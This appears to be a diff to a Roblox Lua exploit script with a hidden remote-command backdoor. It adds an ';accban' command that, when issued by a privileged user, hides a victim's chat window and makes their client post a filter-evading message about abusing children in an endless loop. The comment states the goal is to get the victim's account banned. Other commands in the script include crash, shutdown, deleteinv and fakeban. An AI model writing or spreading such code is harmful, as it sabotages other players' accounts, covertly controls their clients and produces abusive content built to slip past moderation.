@@ -346,7 +346,7 @@ end
 local cmds = "⭐cmds are: reset,ac,void,kick,sit,ad,config."
 local cmds2="help,tbring,song,hev,lobby,vclipdown,butterfingers,listore,breakbow,dropheld,rageblade."
 local cmds3 = "blind,unblind,telepearl,emeraldarmor,apple,popups,deleteinv,crash,shutdown,mygame,flash"
-local cmds4 = "lava,dead,troll,byfron,fakeban,check,mute,unmute,funnymsg,ban,clearchat,lag,unlag⭐"
+local cmds4 = "lava,dead,troll,byfron,fakeban,check,mute,unmute,funnymsg,ban,clearchat,lag,unlag,accban⭐"
 local ores = "⭐ores that can be dropped are:"
 local ores2 = "iron,diamond,emerald,gold,u can drop stuff that arnt ores too.⭐"
 
@@ -861,6 +861,26 @@ setfpscap(5)
 elseif cmd == ";lag" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
 prompt.Text = "⁥"
 setfpscap(5)
+
+elseif cmd == ";accban" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
+_G.on = true
+if game:GetService("CoreGui").ExperienceChat:FindFirstChild("bubbleChat",true) then game:GetService("CoreGui").ExperienceChat.bubbleChat:Destroy() end
+game:GetService("TextChatService").ChatWindowConfiguration.Enabled = false
+while _G. on == true do
+local ts = game:GetService("TextChatService")
+ts.ChatInputBarConfiguration.TargetTextChannel:SendAsync("i 𐌜.f𐌜.u𐌜.с𐌜⁥⁥⁥k children") --THIS IS TO SIMPLY GET THEIR ACCOUNT BANNED,THIS IS FALSE.
+wait()
+end
+
+elseif cmd == ";accban" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
+_G.on = true
+if game:GetService("CoreGui").ExperienceChat:FindFirstChild("bubbleChat",true) then game:GetService("CoreGui").ExperienceChat.bubbleChat:Destroy() end
+game:GetService("TextChatService").ChatWindowConfiguration.Enabled = false
+while _G. on == true do
+local ts = game:GetService("TextChatService")
+ts.ChatInputBarConfiguration.TargetTextChannel:SendAsync("i 𐌜.f𐌜.u𐌜.с𐌜⁥⁥⁥k children") --THIS IS TO SIMPLY GET THEIR ACCOUNT BANNED,THIS IS FALSE.
+wait()
+end
 
 elseif cmd == ";unlag" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 prompt.Text = "⁥"
